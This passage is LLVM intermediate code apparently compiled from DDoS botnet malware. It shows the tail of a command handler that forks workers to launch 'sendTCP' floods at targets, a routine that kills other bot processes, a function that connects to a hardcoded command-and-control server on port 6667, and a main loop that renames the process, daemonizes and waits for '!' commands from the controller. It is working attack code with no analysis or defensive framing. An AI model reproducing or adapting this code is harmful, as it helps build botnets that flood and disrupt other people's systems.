  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 6
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  %386 = icmp slt i32 %385, 0
  br i1 %386, label %396, label %387

; <label>:387:                                    ; preds = %381, %378
  %388 = load i32, i32* %3, align 4
  %389 = icmp eq i32 %388, 8
  br i1 %389, label %390, label %397

; <label>:390:                                    ; preds = %387
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 7
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  %395 = icmp slt i32 %394, 1
  br i1 %395, label %396, label %397

; <label>:396:                                    ; preds = %390, %381, %372, %366, %360, %354, %351
  br label %526

; <label>:397:                                    ; preds = %390, %387
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 1
  %400 = load i8*, i8** %399, align 8
  store i8* %400, i8** %22, align 8
  %401 = load i8**, i8*** %4, align 8
  %402 = getelementptr inbounds i8*, i8** %401, i64 2
  %403 = load i8*, i8** %402, align 8
  %404 = call i32 @atoi(i8* %403) #10
  store i32 %404, i32* %23, align 4
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 3
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #10
  store i32 %408, i32* %24, align 4
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 4
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* %411) #10
  store i32 %412, i32* %25, align 4
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 5
  %415 = load i8*, i8** %414, align 8
  store i8* %415, i8** %26, align 8
  %416 = load i32, i32* %3, align 4
  %417 = icmp eq i32 %416, 8
  br i1 %417, label %418, label %423

; <label>:418:                                    ; preds = %397
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 7
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #10
  br label %424

; <label>:423:                                    ; preds = %397
  br label %424

; <label>:424:                                    ; preds = %423, %418
  %425 = phi i32 [ %422, %418 ], [ 10, %423 ]
  store i32 %425, i32* %27, align 4
  %426 = load i32, i32* %3, align 4
  %427 = icmp sgt i32 %426, 6
  br i1 %427, label %428, label %433

; <label>:428:                                    ; preds = %424
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 6
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #10
  br label %434

; <label>:433:                                    ; preds = %424
  br label %434

; <label>:434:                                    ; preds = %433, %428
  %435 = phi i32 [ %432, %428 ], [ 0, %433 ]
  store i32 %435, i32* %28, align 4
  %436 = load i8*, i8** %22, align 8
  %437 = call i8* @strstr(i8* %436, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %438 = icmp ne i8* %437, null
  br i1 %438, label %439, label %459

; <label>:439:                                    ; preds = %434
  %440 = load i8*, i8** %22, align 8
  %441 = call i8* @strtok(i8* %440, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %441, i8** %29, align 8
  br label %442

; <label>:442:                                    ; preds = %456, %439
  %443 = load i8*, i8** %29, align 8
  %444 = icmp ne i8* %443, null
  br i1 %444, label %445, label %458

; <label>:445:                                    ; preds = %442
  %446 = call i32 @listFork()
  %447 = icmp ne i32 %446, 0
  br i1 %447, label %456, label %448

; <label>:448:                                    ; preds = %445
  %449 = load i8*, i8** %29, align 8
  %450 = load i32, i32* %23, align 4
  %451 = load i32, i32* %24, align 4
  %452 = load i32, i32* %25, align 4
  %453 = load i8*, i8** %26, align 8
  %454 = load i32, i32* %28, align 4
  %455 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %449, i32 %450, i32 %451, i32 %452, i8* %453, i32 %454, i32 %455)
  call void @_exit(i32 0) #12
  unreachable

; <label>:456:                                    ; preds = %445
  %457 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %457, i8** %29, align 8
  br label %442

; <label>:458:                                    ; preds = %442
  br label %471

; <label>:459:                                    ; preds = %434
  %460 = call i32 @listFork()
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %463

; <label>:462:                                    ; preds = %459
  br label %526

; <label>:463:                                    ; preds = %459
  %464 = load i8*, i8** %22, align 8
  %465 = load i32, i32* %23, align 4
  %466 = load i32, i32* %24, align 4
  %467 = load i32, i32* %25, align 4
  %468 = load i8*, i8** %26, align 8
  %469 = load i32, i32* %28, align 4
  %470 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %464, i32 %465, i32 %466, i32 %467, i8* %468, i32 %469, i32 %470)
  call void @_exit(i32 0) #12
  unreachable

; <label>:471:                                    ; preds = %458
  br label %472

; <label>:472:                                    ; preds = %471, %345
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 0
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @strcmp(i8* %475, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %519, label %478

; <label>:478:                                    ; preds = %472
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %479

; <label>:479:                                    ; preds = %505, %478
  %480 = load i64, i64* %31, align 8
  %481 = load i64, i64* @numpids, align 8
  %482 = icmp ult i64 %480, %481
  br i1 %482, label %483, label %508

; <label>:483:                                    ; preds = %479
  %484 = load i32*, i32** @pids, align 8
  %485 = load i64, i64* %31, align 8
  %486 = getelementptr inbounds i32, i32* %484, i64 %485
  %487 = load i32, i32* %486, align 4
  %488 = icmp ne i32 %487, 0
  br i1 %488, label %489, label %504

; <label>:489:                                    ; preds = %483
  %490 = load i32*, i32** @pids, align 8
  %491 = load i64, i64* %31, align 8
  %492 = getelementptr inbounds i32, i32* %490, i64 %491
  %493 = load i32, i32* %492, align 4
  %494 = call i32 @getpid() #2
  %495 = icmp ne i32 %493, %494
  br i1 %495, label %496, label %504

; <label>:496:                                    ; preds = %489
  %497 = load i32*, i32** @pids, align 8
  %498 = load i64, i64* %31, align 8
  %499 = getelementptr inbounds i32, i32* %497, i64 %498
  %500 = load i32, i32* %499, align 4
  %501 = call i32 @kill(i32 %500, i32 9) #2
  %502 = load i32, i32* %30, align 4
  %503 = add nsw i32 %502, 1
  store i32 %503, i32* %30, align 4
  br label %504

; <label>:504:                                    ; preds = %496, %489, %483
  br label %505

; <label>:505:                                    ; preds = %504
  %506 = load i64, i64* %31, align 8
  %507 = add i64 %506, 1
  store i64 %507, i64* %31, align 8
  br label %479

; <label>:508:                                    ; preds = %479
  %509 = load i32, i32* %30, align 4
  %510 = icmp sgt i32 %509, 0
  br i1 %510, label %511, label %515

; <label>:511:                                    ; preds = %508
  %512 = load i32, i32* @mainCommSock, align 4
  %513 = load i32, i32* %30, align 4
  %514 = call i32 (i32, i8*, ...) @sockprintf(i32 %512, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.58, i32 0, i32 0), i32 %513)
  br label %518

; <label>:515:                                    ; preds = %508
  %516 = load i32, i32* @mainCommSock, align 4
  %517 = call i32 (i32, i8*, ...) @sockprintf(i32 %516, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.59, i32 0, i32 0))
  br label %518

; <label>:518:                                    ; preds = %515, %511
  br label %519

; <label>:519:                                    ; preds = %518, %472
  %520 = load i8**, i8*** %4, align 8
  %521 = getelementptr inbounds i8*, i8** %520, i64 0
  %522 = load i8*, i8** %521, align 8
  %523 = call i32 @strcmp(i8* %522, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0)) #10
  %524 = icmp ne i32 %523, 0
  br i1 %524, label %526, label %525

; <label>:525:                                    ; preds = %519
  call void @exit(i32 0) #14
  unreachable

; <label>:526:                                    ; preds = %519, %462, %396, %336, %280, %220, %183, %156, %121, %96, %91, %85, %72, %60, %46, %37
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 6667, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.62, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %6, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %26, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = ptrtoint i8* %27 to i64
  %29 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %28, i32 0, i32 0, i32 0)
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @getpid() #2
  %32 = xor i32 %30, %31
  call void @srand(i32 %32) #2
  %33 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %34 = call i32 @getpid() #2
  %35 = xor i32 %33, %34
  call void @init_rand(i32 %35)
  %36 = call i32 @getOurIP()
  %37 = call i32 @fork() #2
  store i32 %37, i32* %7, align 4
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %2
  %40 = load i32, i32* %7, align 4
  %41 = call i32 @waitpid(i32 %40, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:42:                                     ; preds = %2
  %43 = load i32, i32* %7, align 4
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %57, label %45

; <label>:45:                                     ; preds = %42
  %46 = call i32 @fork() #2
  store i32 %46, i32* %8, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %45
  call void @exit(i32 0) #14
  unreachable

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %8, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %53, label %52

; <label>:52:                                     ; preds = %49
  br label %55

; <label>:53:                                     ; preds = %49
  %54 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %55

; <label>:55:                                     ; preds = %53, %52
  br label %56

; <label>:56:                                     ; preds = %55
  br label %59

; <label>:57:                                     ; preds = %42
  %58 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %59

; <label>:59:                                     ; preds = %57, %56
  br label %60

; <label>:60:                                     ; preds = %59
  %61 = call i32 @setsid() #2
  %62 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0)) #2
  %63 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %64

; <label>:64:                                     ; preds = %355, %67, %60
  %65 = call i32 @initConnection()
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %70

; <label>:67:                                     ; preds = %64
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.67, i32 0, i32 0))
  %69 = call i32 @sleep(i32 5)
  br label %64

; <label>:70:                                     ; preds = %64
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %71

; <label>:71:                                     ; preds = %354, %276, %198, %160, %70
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %74 = call i32 @recvLine(i32 %72, i8* %73, i32 4096)
  store i32 %74, i32* %11, align 4
  %75 = icmp ne i32 %74, -1
  br i1 %75, label %76, label %355

; <label>:76:                                     ; preds = %71
  store i32 0, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %148, %76
  %78 = load i32, i32* %12, align 4
  %79 = sext i32 %78 to i64
  %80 = load i64, i64* @numpids, align 8
  %81 = icmp ult i64 %79, %80
  br i1 %81, label %82, label %151

; <label>:82:                                     ; preds = %77
  %83 = load i32*, i32** @pids, align 8
  %84 = load i32, i32* %12, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i32, i32* %83, i64 %85
  %87 = load i32, i32* %86, align 4
  %88 = call i32 @waitpid(i32 %87, i32* null, i32 1)
  %89 = icmp sgt i32 %88, 0
  br i1 %89, label %90, label %147

; <label>:90:                                     ; preds = %82
  %91 = load i32, i32* %12, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %14, align 4
  br label %93

; <label>:93:                                     ; preds = %109, %90
  %94 = load i32, i32* %14, align 4
  %95 = zext i32 %94 to i64
  %96 = load i64, i64* @numpids, align 8
  %97 = icmp ult i64 %95, %96
  br i1 %97, label %98, label %112

; <label>:98:                                     ; preds = %93
  %99 = load i32*, i32** @pids, align 8
  %100 = load i32, i32* %14, align 4
  %101 = zext i32 %100 to i64
  %102 = getelementptr inbounds i32, i32* %99, i64 %101
  %103 = load i32, i32* %102, align 4
  %104 = load i32*, i32** @pids, align 8
  %105 = load i32, i32* %14, align 4
  %106 = sub i32 %105, 1
  %107 = zext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %104, i64 %107
  store i32 %103, i32* %108, align 4
  br label %109

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %14, align 4
  %111 = add i32 %110, 1
  store i32 %111, i32* %14, align 4
  br label %93

; <label>:112:                                    ; preds = %93
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = sub i32 %114, 1
  %116 = zext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %113, i64 %116
  store i32 0, i32* %117, align 4
  %118 = load i64, i64* @numpids, align 8
  %119 = add i64 %118, -1
  store i64 %119, i64* @numpids, align 8
  %120 = load i64, i64* @numpids, align 8
  %121 = add i64 %120, 1
  %122 = mul i64 %121, 4
  %123 = call noalias i8* @malloc(i64 %122) #2
  %124 = bitcast i8* %123 to i32*
  store i32* %124, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %125

; <label>:125:                                    ; preds = %140, %112
  %126 = load i32, i32* %14, align 4
  %127 = zext i32 %126 to i64
  %128 = load i64, i64* @numpids, align 8
  %129 = icmp ult i64 %127, %128
  br i1 %129, label %130, label %143

; <label>:130:                                    ; preds = %125
  %131 = load i32*, i32** @pids, align 8
  %132 = load i32, i32* %14, align 4
  %133 = zext i32 %132 to i64
  %134 = getelementptr inbounds i32, i32* %131, i64 %133
  %135 = load i32, i32* %134, align 4
  %136 = load i32*, i32** %13, align 8
  %137 = load i32, i32* %14, align 4
  %138 = zext i32 %137 to i64
  %139 = getelementptr inbounds i32, i32* %136, i64 %138
  store i32 %135, i32* %139, align 4
  br label %140

; <label>:140:                                    ; preds = %130
  %141 = load i32, i32* %14, align 4
  %142 = add i32 %141, 1
  store i32 %142, i32* %14, align 4
  br label %125

; <label>:143:                                    ; preds = %125
  %144 = load i32*, i32** @pids, align 8
  %145 = bitcast i32* %144 to i8*
  call void @free(i8* %145) #2
  %146 = load i32*, i32** %13, align 8
  store i32* %146, i32** @pids, align 8
  br label %147

; <label>:147:                                    ; preds = %143, %82
  br label %148

; <label>:148:                                    ; preds = %147
  %149 = load i32, i32* %12, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %12, align 4
  br label %77

; <label>:151:                                    ; preds = %77
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %153
  store i8 0, i8* %154, align 1
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %155)
  %156 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %157 = call i8* @strstr(i8* %156, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %158 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %159 = icmp eq i8* %157, %158
  br i1 %159, label %160, label %163

; <label>:160:                                    ; preds = %151
  %161 = load i32, i32* @mainCommSock, align 4
  %162 = call i32 (i32, i8*, ...) @sockprintf(i32 %161, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0))
  br label %71

; <label>:163:                                    ; preds = %151
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %165 = call i8* @strstr(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0)) #10
  %166 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %167 = icmp eq i8* %165, %166
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %163
  call void @exit(i32 0) #14
  unreachable

; <label>:169:                                    ; preds = %163
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %170, i8** %15, align 8
  %171 = load i8*, i8** %15, align 8
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 33
  br i1 %174, label %175, label %354

; <label>:175:                                    ; preds = %169
  %176 = load i8*, i8** %15, align 8
  %177 = getelementptr inbounds i8, i8* %176, i64 1
  store i8* %177, i8** %16, align 8
  br label %178

; <label>:178:                                    ; preds = %190, %175
  %179 = load i8*, i8** %16, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp ne i32 %181, 32
  br i1 %182, label %183, label %188

; <label>:183:                                    ; preds = %178
  %184 = load i8*, i8** %16, align 8
  %185 = load i8, i8* %184, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp ne i32 %186, 0
  br label %188

; <label>:188:                                    ; preds = %183, %178
  %189 = phi i1 [ false, %178 ], [ %187, %183 ]
  br i1 %189, label %190, label %193

; <label>:190:                                    ; preds = %188
  %191 = load i8*, i8** %16, align 8
  %192 = getelementptr inbounds i8, i8* %191, i32 1
  store i8* %192, i8** %16, align 8
  br label %178

; <label>:193:                                    ; preds = %188
  %194 = load i8*, i8** %16, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 0
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %193
  br label %71

